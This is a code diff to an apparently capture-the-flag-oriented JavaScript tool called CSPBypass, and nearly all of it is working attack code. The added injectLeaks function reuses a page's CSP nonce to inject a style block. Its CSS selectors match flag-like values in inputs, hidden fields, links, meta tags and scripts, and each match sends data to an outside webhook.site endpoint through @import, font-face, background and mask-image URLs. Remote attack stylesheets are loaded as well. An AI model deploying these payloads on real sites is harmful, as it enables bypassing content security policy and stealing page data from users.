@@ -100,7 +100,9 @@ const StyleInjector = {
             case 'hunter':
                 return this.injectHunter(nonce);
             case 'leak':
-                return this.injectAllLeaks(nonce);
+                return this.injectLeaks(nonce);
+            case 'htmlleak':
+                return this.injectHTMLLeaks(nonce);
             default:
                 return this.injectBasic(nonce);
         }
@@ -151,17 +153,85 @@ const StyleInjector = {
         return this.injectCSSFile(nonce, 'https://cdn.jsdelivr.net/gh/ajinabraham/cdn@main/flag_hunter.css');
     },
 
-    injectAllLeaks(nonce) {
-        console.log('💥 [INJECT] Deploying comprehensive HTTP leak arsenal...');
-        
-        // 1. Load comprehensive leak CSS file
-        const cssResult = this.injectCSSFile(nonce, 'https://cdn.jsdelivr.net/gh/ajinabraham/cdn@main/leaks.css');
-        
-        // 2. HTML Element Injection for additional leak vectors
-        this.injectHTMLLeaks(nonce);
-        
-        console.log('✅ [INJECT] Comprehensive leak vectors deployed');
-        return cssResult;
+    injectLeaks(nonce) {
+        const pageUrl = encodeURIComponent(location.href);
+        const style = document.createElement('style');
+        style.setAttribute('nonce', nonce);
+        style.textContent = `
+            /* CSS Import Leaks */
+            @import url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=css_import&page=${pageUrl}');
+            
+            /* Font Face Leaks */
+            @font-face {
+                font-family: 'flag-detector';
+                src: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=font_face&page=${pageUrl}');
+            }
+            html { font-family: 'flag-detector', sans-serif; }
+            
+            /* Flag Detection Leaks */
+            input[value*="flag" i] { 
+                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=input_bg&type=flag&page=${pageUrl}');
+                cursor: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=input_cursor&type=flag&page=${pageUrl}'), auto;
+            }
+            
+            input[value*="ctf{" i] { 
+                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=input_bg&type=ctf_bracket&page=${pageUrl}');
+            }
+            
+            input[value*="flag{" i] { 
+                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=input_bg&type=flag_bracket&page=${pageUrl}');
+            }
+            
+            input[type="hidden"][value*="flag" i] { 
+                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=hidden_input&type=flag&page=${pageUrl}');
+            }
+            
+            form[action*="flag" i] { 
+                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=form_action&type=flag&page=${pageUrl}');
+            }
+            
+            a[href*="flag" i] { 
+                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=link_href&type=flag&page=${pageUrl}');
+            }
+            
+            a[href*="admin" i] { 
+                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=link_href&type=admin&page=${pageUrl}');
+            }
+            
+            meta[content*="flag" i] { 
+                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=meta_content&type=flag&page=${pageUrl}');
+            }
+            
+            script[src*="flag" i] { 
+                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=script_src&type=flag&page=${pageUrl}');
+            }
+            
+            html:has(input[value*="flag" i]) { 
+                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=has_selector&type=input_flag&page=${pageUrl}');
+            }
+            
+            html:has(div[class*="flag" i]) { 
+                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=has_selector&type=div_class_flag&page=${pageUrl}');
+            }
+            
+            html:has(div[id*="flag" i]) { 
+                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=has_selector&type=div_id_flag&page=${pageUrl}');
+            }
+            
+            body::before {
+                content: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=pseudo_before&loaded=true&page=${pageUrl}');
+            }
+            
+            body::after {
+                content: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=pseudo_after&loaded=true&page=${pageUrl}');
+            }
+            
+            html {
+                -webkit-mask-image: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=webkit_mask&loaded=true&page=${pageUrl}');
+            }
+        `;
+        document.head.appendChild(style);
+        return true;
     },
 
     injectHTMLLeaks(nonce) {
@@ -730,10 +800,11 @@ const CSPBypass = {
                 break;
                 
             case 'leak':
-                console.log('💥 [MAIN] Deploying comprehensive HTTP leak arsenal...');
                 StyleInjector.inject(nonce, 'leak');
-                const leakData = DataExfiltrator.collect();
-                DataExfiltrator.exfiltrate(leakData, 'console', nonce);
+                break;
+                
+            case 'htmlleak':
+                StyleInjector.inject(nonce, 'htmlleak');
                 break;
                 
             case 'all':
@@ -744,6 +815,7 @@ const CSPBypass = {
                 StyleInjector.inject(nonce, 'exfill');
                 StyleInjector.inject(nonce, 'hunter');
                 StyleInjector.inject(nonce, 'leak');
+                StyleInjector.inject(nonce, 'htmlleak');
                 const fullData = DataExfiltrator.collect();
                 const huntResults = Hunter.hunt();
                 DataExfiltrator.exfiltrate({ data: fullData, hunt: huntResults }, 'console', nonce);
@@ -771,8 +843,8 @@ if (document.readyState === 'loading') {
 window.CSPBypass = CSPBypass;
 window.runBasic = () => CSPBypass.run('basic');
 window.runComp = () => CSPBypass.run('comp');
-
 window.runExfill = () => CSPBypass.run('exfill');
 window.runHunter = () => CSPBypass.run('hunter');
 window.runFlag = () => CSPBypass.run('flag');
 window.runLeak = () => CSPBypass.run('leak');
+window.runHTMLLeak = () => CSPBypass.run('htmlleak');
